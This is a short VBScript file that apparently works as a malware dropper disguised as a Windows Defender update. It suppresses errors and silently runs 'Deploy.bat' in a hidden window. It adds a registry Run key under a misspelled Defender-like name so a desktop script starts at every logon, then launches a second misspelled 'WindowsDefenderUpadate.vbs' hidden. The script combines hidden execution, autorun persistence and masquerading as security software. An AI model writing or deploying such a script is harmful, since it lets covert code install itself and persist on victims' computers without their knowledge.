Option Explicit
On Error Resume Next 
Dim ws,fso
Set ws = CreateObject("wscript.shell")
Set fso = CreateObject("Scripting.FileSystemObject")
ws.Run "Deploy.bat",0,true
ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDeferderUpdate","C:\Users\Stacifer\Desktop\WindowsDeferderUpdate.vbs","REG_SZ"
ws.Run "c:\Intel\Old Window\WindowsDefenderUpadate.vbs",0,false